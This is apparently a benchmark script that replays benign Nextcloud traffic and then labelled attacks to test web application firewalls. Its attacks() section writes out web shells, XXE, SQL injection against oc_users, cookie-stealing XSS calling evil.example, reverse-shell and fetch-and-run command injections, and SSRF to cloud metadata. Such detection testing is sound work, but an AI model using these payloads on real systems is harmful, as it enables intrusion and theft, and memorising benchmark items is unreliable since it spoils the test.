"""Scripted Nextcloud traffic: a user working with files, notes, calendar and contacts, plus attacks.

Every call to Actor.send() goes through both WAFs. `B()` marks benign use and
`A()` an attack, with the input (`target`) that carries the content of interest.
"""
from __future__ import annotations

import json
import re
import urllib.parse
import uuid

from benchlib import CREDENTIALS, Bench

USER = CREDENTIALS["nc_user"]
DAV = f"/remote.php/dav/files/{USER}"


def B(rid, category, notes, collection=None, parameter=None):
    return {"id": f"nc-{rid}", "kind": "benign", "category": category, "notes": notes,
            "target": {"collection": collection, "parameter": parameter} if collection else None}


def A(rid, category, notes, collection, parameter=None):
    return {"id": f"nc-atk-{rid}", "kind": "attack", "category": category, "notes": notes,
            "target": {"collection": collection, "parameter": parameter}}


def q(path: str) -> str:
    """Percent-encode each path segment the way the Files app does (encodeURIComponent)."""
    return "/".join(urllib.parse.quote(segment, safe="'()!*~") for segment in path.split("/"))


PROPFIND_FILES = ('<?xml version="1.0"?>\n<d:propfind xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns" '
                  'xmlns:nc="http://nextcloud.org/ns" xmlns:ocs="http://open-collaboration-services.org/ns">'
                  '<d:prop><d:getcontentlength/><d:getcontenttype/><d:getetag/><d:getlastmodified/>'
                  '<d:creationdate/><d:displayname/><d:quota-available-bytes/><d:resourcetype/>'
                  '<nc:has-preview/><nc:is-encrypted/><nc:mount-type/><oc:comments-unread/><oc:favorite/>'
                  '<oc:fileid/><oc:owner-display-name/><oc:owner-id/><oc:permissions/><oc:size/>'
                  '<nc:hidden/><nc:is-mount-root/><nc:metadata-blurhash/><nc:metadata-files-live-photo/>'
                  '<nc:note/><nc:sharees/><nc:hide-download/><nc:share-attributes/><oc:share-types/>'
                  '<ocs:share-permissions/><nc:system-tags/></d:prop></d:propfind>')

FILES = [
    ("O'Brien notes (v2).md", "text/markdown",
     "# Meeting notes\n\n* select the best vendor by Friday\n* `SELECT count(*) FROM orders;` returned 42\n"
     "* union reps: Ana & Bo\n\n> \"drop what does not serve you\"\n"),
    ("Q3 report [final] – 2026.csv", "text/csv",
     "region,revenue,formula\nEMEA,1200,=SUM(B2:B3)\nAPAC,980,\"=IF(B3>1000,\"\"ok\"\",\"\"low\"\")\"\n"),
    ("backup.sh", "application/x-sh",
     "#!/bin/bash\nset -euo pipefail\nrsync -av --delete /home/ /mnt/backup/home/\n"
     "tar -czf /mnt/backup/etc-$(date +%F).tgz /etc && echo done\nfind /mnt/backup -mtime +30 -exec rm {} \\;\n"),
    ("schema & seed.sql", "application/sql",
     "DROP TABLE IF EXISTS users;\nCREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT);\n"
     "INSERT INTO users (name) VALUES ('O''Neil'), ('Zoë');\nSELECT * FROM users WHERE name LIKE '%e%' UNION SELECT 0, 'x';\n"),
    ("index.php", "application/x-php",
     "<?php\n// small personal project, synced for backup\nrequire __DIR__ . '/vendor/autoload.php';\n"
     "echo htmlspecialchars($_GET['name'] ?? 'world');\n"),
    ("résumé (Zoë) #1.txt", "text/plain", "Zoë Müller\nSkills: SQL (select, join, union), bash, C:\\Program Files\\...\n"),
    ("config.example.json", "application/json",
     "{\"db\": {\"dsn\": \"mysql://app@localhost/app\", \"query\": \"select 1\"}, \"paths\": [\"../shared\", \"/etc/app\"]}\n"),
    ("page.html", "text/html",
     "<!doctype html><html><head><script src=\"app.js\"></script></head>"
     "<body onload=\"init()\"><a href=\"javascript:void(0)\">menu</a></body></html>\n"),
]

EVENTS = [
    ("Standup: select the best sprint goals", "Agenda:\n- union of team backlogs\n- drop stale tickets\nhttps://meet.example.org/room?id=42&pwd=no",
     "Room 3; \"The Aquarium\""),
    ("Dentist (Dr. O'Hara)", "Bring insurance card <important>", "Main St. 1 & 2"),
    ("Deploy window", "Run: ssh deploy@app01 'sudo systemctl restart nginx' && curl -I https://example.org/healthz",
     "ops channel #deploys"),
]

CONTACTS = [
    ("Zoë O'Neil-Smith", "zoe@example.org", "Met at the SQL meetup; she said \"select the best, union the rest\"",
     "https://zoe.example.org/?ref=card&x=1"),
    ("Bo <Sales>", "bo@example.net", "Prefers calls after 2pm; drop by office #12", ""),
]

NOTES = [
    ("Groceries & plans", "# Groceries\n- [ ] milk\n- [x] bread\n\n## Plans\nselect the best tomatoes; drop the bruised ones\n", "Personal"),
    ("SQL snippets", "```sql\nSELECT id, name FROM users WHERE active = 1 ORDER BY name;\nDELETE FROM sessions WHERE expires < now();\n```\n", "Work/DB"),
    ("Server cheatsheet", "`journalctl -u nginx --since today`\n`cat /etc/os-release`\n`ls -la ~/.ssh`\n<kbd>Ctrl</kbd>+<kbd>C</kbd>\n", "Work"),
]


def ics(uid, summary, description, location, url=None):
    lines = ["BEGIN:VCALENDAR", "VERSION:2.0", "PRODID:-//IDN nextcloud.com//Calendar app 6.7.0//EN", "CALSCALE:GREGORIAN",
             "BEGIN:VEVENT", "CREATED:20261127T100000Z", "DTSTAMP:20261127T100000Z", "LAST-MODIFIED:20261127T100000Z",
             "SEQUENCE:1", f"UID:{uid}", "DTSTART;TZID=Europe/Berlin:20261203T100000",
             "DTEND;TZID=Europe/Berlin:20261203T110000", "STATUS:CONFIRMED", f"SUMMARY:{summary}",
             "DESCRIPTION:" + description.replace("\n", "\\n").replace(",", "\\,").replace(";", "\\;"),
             "LOCATION:" + location.replace(",", "\\,").replace(";", "\\;")]
    if url:
        lines.append(f"URL:{url}")
    lines += ["END:VEVENT", "END:VCALENDAR", ""]
    return "\r\n".join(lines)


def vcard(uid, name, email, note, url):
    lines = ["BEGIN:VCARD", "VERSION:3.0", "PRODID:-//Nextcloud Contacts v8.10.0", f"UID:{uid}", f"FN:{name}",
             f"N:{name.split(' ')[-1]};{name.split(' ')[0]};;;", f"EMAIL;TYPE=HOME:{email}", f"NOTE:{note}",
             "ADR;TYPE=HOME:;;Hauptstraße 5;Berlin;;10115;Germany"]
    if url:
        lines.append(f"URL:{url}")
    lines += ["REV:20261127T100000Z", "END:VCARD", ""]
    return "\r\n".join(lines)


class Session:
    def __init__(self, bench: Bench):
        self.bench = bench
        self.web = bench.actor("nextcloud")
        self.token = ""

    @property
    def h(self):
        return {"requesttoken": self.token, "OCS-APIRequest": "true", "Accept": "application/json, text/plain, */*",
                "X-Requested-With": "XMLHttpRequest"}

    def dav(self, method, path, *, body=None, content_type=None, headers=None, record=None):
        return self.web.send(method, path, body=body, content_type=content_type,
                             headers={**self.h, **(headers or {})}, record=record)


def login(s: Session) -> None:
    page = s.web.get("/login", record=B("login-page", "login", "login page"))
    token = re.search(r'data-requesttoken="([^"]+)"', page.text)
    s.web.send("POST", "/login", form=[("user", USER), ("password", CREDENTIALS["nc_password"]),
                                       ("timezone", "Europe/Berlin"), ("timezone_offset", "1"),
                                       ("requesttoken", token.group(1) if token else "")],
               record=B("login-submit", "login", "web login form", "ARGS", "user"))
    s.web.get("/index.php/apps/dashboard/")
    s.token = (s.web.get("/index.php/csrftoken").json() or {}).get("token", "")
    s.web.get("/ocs/v2.php/apps/dashboard/api/v2/widget-items?widgets[]=recommendations&widgets[]=activity", headers=s.h)
    s.web.get("/ocs/v2.php/apps/notifications/api/v2/notifications", headers=s.h)
    s.web.get("/ocs/v2.php/apps/user_status/api/v1/user_status", headers=s.h)


def files(s: Session) -> dict[str, str]:
    s.web.get("/index.php/apps/files/")
    s.dav("PROPFIND", DAV + "/", body=PROPFIND_FILES, content_type="application/xml; charset=utf-8",
          headers={"Depth": "1"}, record=B("propfind-root", "webdav", "Files app folder listing PROPFIND", "REQUEST_BODY"))
    for n, folder in enumerate(["Projects & Ideas", "Code (draft) #2", "Photos 2026/Ski trip – Ålesund"]):
        parts = folder.split("/")
        for depth in range(1, len(parts) + 1):
            s.dav("MKCOL", q(DAV + "/" + "/".join(parts[:depth])),
                  record=B(f"mkcol-{n}-{depth}", "webdav", "create folder with odd name", "REQUEST_FILENAME"))
    ids = {}
    for n, (name, ctype, content) in enumerate(FILES):
        s.dav("PUT", q(f"{DAV}/Projects & Ideas/{name}"), body=content, content_type=ctype,
              record=B(f"upload-{n}", "upload", f"upload {name}", "REQUEST_BODY"))
    s.dav("PROPFIND", q(DAV + "/Projects & Ideas/"), body=PROPFIND_FILES, content_type="application/xml; charset=utf-8",
          headers={"Depth": "1"}, record=B("propfind-folder", "webdav", "list folder with uploads", "REQUEST_BODY"))
    listing = s.dav("PROPFIND", q(DAV + "/Projects & Ideas/"), body=PROPFIND_FILES,
                    content_type="application/xml; charset=utf-8", headers={"Depth": "1"})
    for href, fileid in re.findall(r"<d:href>([^<]+)</d:href>.*?<oc:fileid>(\d+)</oc:fileid>", listing.text, re.S):
        ids[urllib.parse.unquote(href.rsplit("/", 1)[-1])] = fileid
    s.dav("MOVE", q(f"{DAV}/Projects & Ideas/backup.sh"),
          headers={"Destination": "http://nc.bench" + q(f"{DAV}/Code (draft) #2/backup (old; do not run).sh"), "Overwrite": "F"},
          record=B("move-rename", "webdav", "rename/move file to odd name", "REQUEST_HEADERS", "Destination"))
    s.dav("COPY", q(f"{DAV}/Projects & Ideas/schema & seed.sql"),
          headers={"Destination": "http://nc.bench" + q(f"{DAV}/Code (draft) #2/schema & seed (copy).sql"), "Overwrite": "T"},
          record=B("copy", "webdav", "copy file", "REQUEST_HEADERS", "Destination"))
    s.dav("PROPPATCH", q(f"{DAV}/Projects & Ideas/O'Brien notes (v2).md"),
          body='<?xml version="1.0"?><d:propertyupdate xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns">'
               '<d:set><d:prop><oc:favorite>1</oc:favorite></d:prop></d:set></d:propertyupdate>',
          content_type="application/xml; charset=utf-8", record=B("favorite", "webdav", "mark favorite", "REQUEST_BODY"))
    s.dav("REPORT", DAV + "/", content_type="application/xml; charset=utf-8",
          body='<?xml version="1.0"?><oc:filter-files xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns" '
               'xmlns:nc="http://nextcloud.org/ns"><d:prop><oc:fileid/><d:displayname/></d:prop>'
               '<oc:filter-rules><oc:favorite>1</oc:favorite></oc:filter-rules></oc:filter-files>',
          record=B("report-favorites", "webdav", "favorites view REPORT", "REQUEST_BODY"))
    s.dav("SEARCH", "/remote.php/dav/", content_type="text/xml",
          body='<?xml version="1.0" encoding="UTF-8"?><d:searchrequest xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns">'
               '<d:basicsearch><d:select><d:prop><oc:fileid/><d:displayname/></d:prop></d:select>'
               f'<d:from><d:scope><d:href>/files/{USER}</d:href><d:depth>infinity</d:depth></d:scope></d:from>'
               '<d:where><d:like><d:prop><d:displayname/></d:prop><d:literal>%select%</d:literal></d:like></d:where>'
               '<d:orderby/></d:basicsearch></d:searchrequest>',
          record=B("dav-search", "search", "Files app name search (DAV SEARCH)", "REQUEST_BODY"))
    fid = ids.get("O'Brien notes (v2).md")
    if fid:
        s.dav("POST", f"/remote.php/dav/comments/files/{fid}", content_type="application/json",
              body=json.dumps({"actorType": "users", "verb": "comment",
                               "message": "Can we select the best 3 options? See ../Code (draft) #2 & ping @bea"}),
              record=B("file-comment", "comments", "comment on a file", "REQUEST_BODY"))
        s.dav("PROPFIND", f"/remote.php/dav/versions/{USER}/versions/{fid}/", headers={"Depth": "1"},
              content_type="application/xml; charset=utf-8",
              body='<?xml version="1.0"?><d:propfind xmlns:d="DAV:"><d:prop><d:getcontentlength/><d:getlastmodified/></d:prop></d:propfind>')
    s.dav("PUT", q(f"{DAV}/Projects & Ideas/O'Brien notes (v2).md"), content_type="text/markdown",
          body=FILES[0][2] + "\n## Update\n`rm -rf ./build && make` fixed it; also check C:\\Temp\\logs\n",
          record=B("edit-markdown", "upload", "save edited markdown document", "REQUEST_BODY"))
    s.dav("DELETE", q(f"{DAV}/Projects & Ideas/page.html"), record=B("delete", "webdav", "delete file", "REQUEST_FILENAME"))
    s.dav("PROPFIND", f"/remote.php/dav/trashbin/{USER}/trash/", headers={"Depth": "1"},
          content_type="application/xml; charset=utf-8",
          body='<?xml version="1.0"?><d:propfind xmlns:d="DAV:" xmlns:nc="http://nextcloud.org/ns"><d:prop>'
               '<nc:trashbin-filename/><nc:trashbin-original-location/><nc:trashbin-deletion-time/></d:prop></d:propfind>')
    s.web.get(q(f"{DAV}/Projects & Ideas/schema & seed.sql"), headers=s.h, record=B("download", "webdav", "download a file"))
    return ids


def text_editor(s: Session, ids: dict[str, str]) -> None:
    fid = ids.get("résumé (Zoë) #1.txt")
    if not fid:
        return
    r = s.web.send("PUT", f"/index.php/apps/text/session/file/{fid}/create", headers=s.h, json_body={},
                   record=B("text-session-create", "text", "open document in the Text editor"))
    data = r.json() if isinstance(r.json(), dict) else {}
    session = data.get("session") or {}
    doc = (data.get("document") or {}).get("id")
    if not (session and doc):
        return
    content = ("Zoë Müller\n\nSkills: SQL (select, join, union), bash, `C:\\Program Files\\`\n\n"
               "> select the best people & drop the ego\n\n<details><summary>more</summary>…</details>\n")
    s.web.send("POST", f"/index.php/apps/text/session/{doc}/save", headers=s.h, json_body={
        "documentId": doc, "sessionId": session.get("id"), "sessionToken": session.get("token"),
        "version": 0, "autosaveContent": content, "documentState": "", "force": False, "manualSave": True},
        record=B("text-save", "text", "save in the Text editor (markdown autosave)", "ARGS", "json.autosaveContent"))
    s.web.send("POST", f"/index.php/apps/text/session/{doc}/close", headers=s.h, json_body={
        "documentId": doc, "sessionId": session.get("id"), "sessionToken": session.get("token")})


def shares(s: Session) -> None:
    api = "/ocs/v2.php/apps/files_sharing/api/v1/shares"
    s.web.send("POST", api, headers=s.h, json_body={
        "path": "/Projects & Ideas/O'Brien notes (v2).md", "shareType": 0, "shareWith": "bea", "permissions": 19,
        "note": "Pls review; select the best 2 & drop the rest", "attributes": "[]"},
        record=B("share-user", "share", "share file with a user, with a note", "ARGS", "json.note"))
    r = s.web.send("POST", api, headers=s.h, json_body={"path": "/Code (draft) #2", "shareType": 3, "permissions": 1,
                                                        "label": "Code <draft> for O'Hara"},
                   record=B("share-link", "share", "create a public link share", "ARGS", "json.label"))
    share_id = ((r.json() or {}).get("ocs") or {}).get("data", {}).get("id") if isinstance(r.json(), dict) else None
    if share_id:
        s.web.send("PUT", f"{api}/{share_id}", headers=s.h,
                   json_body={"note": "Read-only. Run `make test` first; see ../README & C:\\docs", "expireDate": "2026-12-31"},
                   record=B("share-update", "share", "update share note and expiry", "ARGS", "json.note"))
    s.web.get(f"{api}?format=json&path=%2FProjects%20%26%20Ideas%2FO%27Brien%20notes%20(v2).md&reshares=true", headers=s.h)
    s.web.get("/ocs/v2.php/apps/files_sharing/api/v1/sharees?format=json&search=bea&perPage=25&itemType=file", headers=s.h)


def notes(s: Session) -> None:
    ids = []
    for n, (title, content, category) in enumerate(NOTES):
        r = s.web.send("POST", "/index.php/apps/notes/api/v1/notes", headers=s.h,
                       json_body={"title": title, "content": content, "category": category},
                       record=B(f"note-create-{n}", "notes", "create markdown note", "ARGS", "json.content"))
        if isinstance(r.json(), dict) and r.json().get("id"):
            ids.append(r.json()["id"])
    if ids:
        s.web.send("PUT", f"/index.php/apps/notes/api/v1/notes/{ids[0]}", headers=s.h,
                   json_body={"content": NOTES[0][1] + "\n- union square market, 9am\n- `select * from fridge`\n"},
                   record=B("note-edit", "notes", "edit markdown note", "ARGS", "json.content"))
    s.web.get("/index.php/apps/notes/api/v1/notes?exclude=content", headers=s.h)


def calendar(s: Session) -> None:
    home = f"/remote.php/dav/calendars/{USER}/"
    s.dav("PROPFIND", home, headers={"Depth": "1"}, content_type="application/xml; charset=utf-8",
          body='<?xml version="1.0"?><d:propfind xmlns:d="DAV:" xmlns:cs="http://calendarserver.org/ns/" '
               'xmlns:c="urn:ietf:params:xml:ns:caldav" xmlns:oc="http://owncloud.org/ns"><d:prop><d:displayname/>'
               '<cs:getctag/><c:supported-calendar-component-set/><oc:calendar-enabled/></d:prop></d:propfind>',
          record=B("caldav-propfind", "calendar", "calendar app loads calendar list", "REQUEST_BODY"))
    for n, (summary, description, location) in enumerate(EVENTS):
        uid = str(uuid.uuid4()).upper()
        s.dav("PUT", f"{home}personal/{uid}.ics", content_type="text/calendar; charset=utf-8",
              body=ics(uid, summary, description, location, "https://example.org/agenda?id=7&view=full" if n == 0 else None),
              record=B(f"caldav-event-{n}", "calendar", "create calendar event", "REQUEST_BODY"))
    s.dav("REPORT", f"{home}personal/", headers={"Depth": "1"}, content_type="application/xml; charset=utf-8",
          body='<?xml version="1.0"?><c:calendar-query xmlns:d="DAV:" xmlns:c="urn:ietf:params:xml:ns:caldav">'
               '<d:prop><d:getetag/><c:calendar-data/></d:prop><c:filter><c:comp-filter name="VCALENDAR">'
               '<c:comp-filter name="VEVENT"><c:time-range start="20261123T000000Z" end="20261207T000000Z"/>'
               '</c:comp-filter></c:comp-filter></c:filter></c:calendar-query>',
          record=B("caldav-report", "calendar", "calendar time-range query", "REQUEST_BODY"))


def contacts(s: Session) -> None:
    book = f"/remote.php/dav/addressbooks/users/{USER}/contacts/"
    for n, (name, email, note, url) in enumerate(CONTACTS):
        uid = str(uuid.uuid4())
        s.dav("PUT", f"{book}{uid}.vcf", content_type="text/vcard; charset=utf-8", body=vcard(uid, name, email, note, url),
              record=B(f"carddav-contact-{n}", "contacts", "create contact", "REQUEST_BODY"))
    s.dav("REPORT", book, headers={"Depth": "1"}, content_type="application/xml; charset=utf-8",
          body='<?xml version="1.0"?><card:addressbook-query xmlns:d="DAV:" xmlns:card="urn:ietf:params:xml:ns:carddav">'
               '<d:prop><d:getetag/><card:address-data/></d:prop><card:filter><card:prop-filter name="FN">'
               '<card:text-match match-type="contains">O\'Neil</card:text-match></card:prop-filter></card:filter>'
               '</card:addressbook-query>',
          record=B("carddav-report", "contacts", "contact search REPORT", "REQUEST_BODY"))


def settings_and_ocs(s: Session) -> None:
    users = f"/ocs/v2.php/cloud/users/{USER}"
    for n, (key, value) in enumerate([("displayname", "Zoë O'Neil-Smith"),
                                      ("biography", "DBA. I select the best, union the rest & drop the rest.\nPGP: 0xDEADBEEF"),
                                      ("website", "https://zoe.example.org/?ref=nc&lang=en"),
                                      ("address", "Hauptstraße 5; 10115 Berlin"),
                                      ("headline", "<SQL> & shell person")]):
        s.web.send("PUT", users, headers=s.h, json_body={"key": key, "value": value},
                   record=B(f"settings-{key}", "settings", f"personal info: {key}", "ARGS", "json.value"))
    s.web.send("PUT", "/ocs/v2.php/apps/user_status/api/v1/user_status/message/custom", headers=s.h,
               json_body={"statusIcon": "🍝", "message": "Lunch; back @ 2pm (select the best pasta)", "clearAt": None},
               record=B("user-status", "settings", "custom status message", "ARGS", "json.message"))
    s.web.send("POST", "/index.php/apps/theming/ajax/updateStylesheet", headers=s.h,
               json_body={"setting": "slogan", "value": "Files & notes; select the best, drop the rest"},
               record=B("theming-slogan", "settings", "admin theming slogan", "ARGS", "json.value"))
    s.web.send("POST", "/index.php/apps/theming/ajax/updateStylesheet", headers=s.h,
               json_body={"setting": "url", "value": "https://example.org/about?team=it&x=1"},
               record=B("theming-url", "settings", "admin theming web link", "ARGS", "json.value"))
    s.web.send("POST", "/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/shareapi_default_internal_expire_date",
               headers=s.h, form=[("value", "no")])
    for n, term in enumerate(["select the best", "O'Brien", "../Code", "union & drop"]):
        s.web.get("/ocs/v2.php/search/providers/files/search", query={"term": term, "limit": "5", "from": "/apps/files/"},
                  headers=s.h, record=B(f"unified-search-{n}", "search", "unified search", "ARGS", "term"))
    s.web.get("/ocs/v2.php/cloud/capabilities?format=json", headers=s.h)
    s.web.get("/ocs/v2.php/cloud/user?format=json", headers=s.h)
    s.web.get("/ocs/v2.php/apps/recommendations/api/v1/recommendations", headers=s.h)
    s.web.get("/ocs/v2.php/references/resolve", query={"reference": "https://nextcloud.com/blog/"}, headers=s.h,
              record=B("reference-resolve", "ocs", "link preview (server fetches URL)", "ARGS", "reference"))
    s.web.get("/index.php/settings/user")
    s.web.get("/index.php/settings/admin/theming")


def desktop_client(s: Session) -> None:
    """The desktop sync client: Basic auth, its own User-Agent, plain WebDAV."""
    client = s.bench.actor("nextcloud", {"User-Agent": "Mozilla/5.0 (Linux) mirall/3.15.0 (Nextcloud, debian-6.8 ClientArchitecture: x86_64 OsArchitecture: x86_64)",
                                         "Accept": "*/*"})
    auth = {"Authorization": s.bench.basic_auth(USER, CREDENTIALS["nc_password"])}
    client.send("PROPFIND", DAV + "/", headers={**auth, "Depth": "1"}, content_type="application/xml; charset=utf-8",
                body='<?xml version="1.0" ?>\n<d:propfind xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns">'
                     '<d:prop><d:resourcetype/><d:getlastmodified/><d:getetag/><oc:id/><oc:permissions/></d:prop></d:propfind>',
                record=B("sync-propfind", "webdav", "desktop client sync PROPFIND", "REQUEST_BODY"))
    client.send("PUT", q(f"{DAV}/Projects & Ideas/notes from desktop (1).txt"), headers=auth,
                content_type="application/octet-stream",
                body="Synced from laptop.\nTODO: grep -R \"password\" ./config ; never commit .env\n",
                record=B("sync-put", "upload", "desktop client upload", "REQUEST_BODY"))


# --- attacks ------------------------------------------------------------------

def attacks(s: Session) -> None:
    # Path traversal and odd file names through WebDAV.
    s.dav("PUT", DAV + "/..%2F..%2F..%2Fconfig%2Fconfig.php", body="x", content_type="text/plain",
          record=A("lfi-dav-put-path", "lfi", "path traversal in WebDAV upload path", "REQUEST_FILENAME"))
    s.dav("MOVE", q(f"{DAV}/Projects & Ideas/résumé (Zoë) #1.txt"),
          headers={"Destination": f"http://nc.bench{DAV}/../../../../../var/www/html/config/x.php"},
          record=A("lfi-dav-move-destination", "lfi", "path traversal in MOVE Destination header", "REQUEST_HEADERS", "Destination"))
    s.web.get("/index.php/apps/files/ajax/download.php", query={"dir": "/", "files": "../../../../etc/passwd"}, headers=s.h,
              record=A("lfi-download", "lfi", "path traversal in download file name", "ARGS", "files"))
    # Web shell uploads.
    s.dav("PUT", q(f"{DAV}/Projects & Ideas/shell.php"), body="<?php system($_GET['c']); ?>", content_type="application/x-php",
          record=A("php-dav-webshell", "php", "PHP web shell uploaded over WebDAV", "REQUEST_BODY"))
    s.dav("PUT", q(f"{DAV}/Projects & Ideas/avatar.png.phtml"), body="GIF89a<?php eval($_POST['x']); ?>", content_type="image/png",
          record=A("php-dav-polyglot", "php", "polyglot PHP upload with image content type", "REQUEST_BODY"))
    # XXE in a DAV body.
    s.dav("PROPFIND", DAV + "/", headers={"Depth": "1"}, content_type="application/xml; charset=utf-8",
          body='<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
               '<d:propfind xmlns:d="DAV:"><d:prop><d:displayname>&x;</d:displayname></d:prop></d:propfind>',
          record=A("lfi-dav-xxe", "lfi", "XXE external entity in PROPFIND body", "REQUEST_BODY"))
    # SQLi in search.
    for n, term in enumerate(["' UNION SELECT uid,password FROM oc_users-- -", "x') OR 1=1--", "1;SELECT pg_sleep(5)"]):
        s.web.get("/ocs/v2.php/search/providers/files/search", query={"term": term, "limit": "5"}, headers=s.h,
                  record=A(f"sqli-unified-search-{n}", "sqli", "SQLi in unified search term", "ARGS", "term"))
    s.dav("SEARCH", "/remote.php/dav/", content_type="text/xml",
          body='<?xml version="1.0"?><d:searchrequest xmlns:d="DAV:"><d:basicsearch><d:select><d:prop><d:displayname/>'
               f'</d:prop></d:select><d:from><d:scope><d:href>/files/{USER}</d:href><d:depth>infinity</d:depth></d:scope>'
               "</d:from><d:where><d:like><d:prop><d:displayname/></d:prop><d:literal>%' UNION SELECT password FROM oc_users-- </d:literal>"
               "</d:like></d:where></d:basicsearch></d:searchrequest>",
          record=A("sqli-dav-search", "sqli", "SQLi in DAV SEARCH literal", "REQUEST_BODY"))
    s.web.send("POST", "/login", form=[("user", "admin' OR '1'='1"), ("password", "x"), ("timezone", "UTC"),
                                       ("timezone_offset", "0"), ("requesttoken", s.token)],
               record=A("sqli-login", "sqli", "SQLi in login user", "ARGS", "user"))
    # XSS in share notes, settings, notes, comments, contacts.
    api = "/ocs/v2.php/apps/files_sharing/api/v1/shares"
    s.web.send("POST", api, headers=s.h, json_body={"path": "/Projects & Ideas/index.php", "shareType": 3, "permissions": 1,
                                                    "note": "<script>fetch('//evil.example/?c='+document.cookie)</script>"},
               record=A("xss-share-note", "xss", "stored XSS in share note", "ARGS", "json.note"))
    s.web.send("PUT", f"/ocs/v2.php/cloud/users/{USER}", headers=s.h,
               json_body={"key": "displayname", "value": "<img src=x onerror=alert(document.domain)>"},
               record=A("xss-displayname", "xss", "stored XSS in display name", "ARGS", "json.value"))
    s.web.send("POST", "/index.php/apps/notes/api/v1/notes", headers=s.h,
               json_body={"title": "<svg onload=alert(1)>", "content": "<iframe src=javascript:alert(1)>", "category": ""},
               record=A("xss-note", "xss", "stored XSS in note content", "ARGS", "json.content"))
    s.dav("POST", "/remote.php/dav/comments/files/1", content_type="application/json",
          body=json.dumps({"actorType": "users", "verb": "comment", "message": "<script>alert(document.cookie)</script>"}),
          record=A("xss-file-comment", "xss", "stored XSS in file comment", "REQUEST_BODY"))
    uid = str(uuid.uuid4())
    s.dav("PUT", f"/remote.php/dav/addressbooks/users/{USER}/contacts/{uid}.vcf", content_type="text/vcard; charset=utf-8",
          body=vcard(uid, "Mallory", "m@example.org", "<script>alert(1)</script>", "javascript:alert(document.cookie)"),
          record=A("xss-contact", "xss", "XSS payloads in a contact card", "REQUEST_BODY"))
    # Command injection.
    uid = str(uuid.uuid4()).upper()
    s.dav("PUT", f"/remote.php/dav/calendars/{USER}/personal/{uid}.ics", content_type="text/calendar; charset=utf-8",
          body=ics(uid, "x", "$(wget -qO- http://evil.example/s.sh | sh)", "; cat /etc/passwd"),
          record=A("rce-calendar-event", "rce", "command injection in calendar event fields", "REQUEST_BODY"))
    s.web.send("PUT", f"/ocs/v2.php/cloud/users/{USER}", headers=s.h,
               json_body={"key": "biography", "value": "hi `nc -e /bin/sh 203.0.113.9 4444`"},
               record=A("rce-biography", "rce", "command injection in biography", "ARGS", "json.value"))
    s.web.send("POST", "/index.php/apps/notes/api/v1/notes", headers=s.h,
               json_body={"title": "x", "content": "; curl http://evil.example/x | bash", "category": ""},
               record=A("rce-note", "rce", "command injection in note content", "ARGS", "json.content"))
    # PHP code injection.
    s.web.send("POST", "/index.php/apps/theming/ajax/updateStylesheet", headers=s.h,
               json_body={"setting": "slogan", "value": "<?php echo shell_exec($_GET['c']); ?>"},
               record=A("php-theming-slogan", "php", "PHP code in theming slogan", "ARGS", "json.value"))
    s.web.send("PUT", f"/ocs/v2.php/cloud/users/{USER}", headers=s.h,
               json_body={"key": "headline", "value": "O:8:\"stdClass\":1:{s:1:\"a\";s:10:\"/etc/hosts\";}"},
               record=A("php-headline-serialized", "php", "PHP object injection in profile headline", "ARGS", "json.value"))
    # SSRF.
    for n, target in enumerate(["http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                "http://127.0.0.1:6379/", "file:///etc/passwd"]):
        s.web.get("/ocs/v2.php/references/resolve", query={"reference": target}, headers=s.h,
                  record=A(f"ssrf-reference-{n}", "ssrf", "SSRF through link-preview resolver", "ARGS", "reference"))
    s.web.send("POST", "/index.php/apps/theming/ajax/updateStylesheet", headers=s.h,
               json_body={"setting": "url", "value": "http://169.254.169.254/latest/meta-data/"},
               record=A("ssrf-theming-url", "ssrf", "cloud metadata URL as theming web link", "ARGS", "json.value"))
    s.web.get("/index.php/apps/files_pdfviewer/", query={"file": "http://169.254.169.254/latest/meta-data/"},
              record=A("ssrf-pdfviewer", "ssrf", "SSRF-style URL in pdf viewer file parameter", "ARGS", "file"))


def run(bench: Bench) -> None:
    s = Session(bench)
    login(s)
    ids = files(s)
    text_editor(s, ids)
    shares(s)
    notes(s)
    calendar(s)
    contacts(s)
    settings_and_ocs(s)
    desktop_client(s)
    attacks(s)
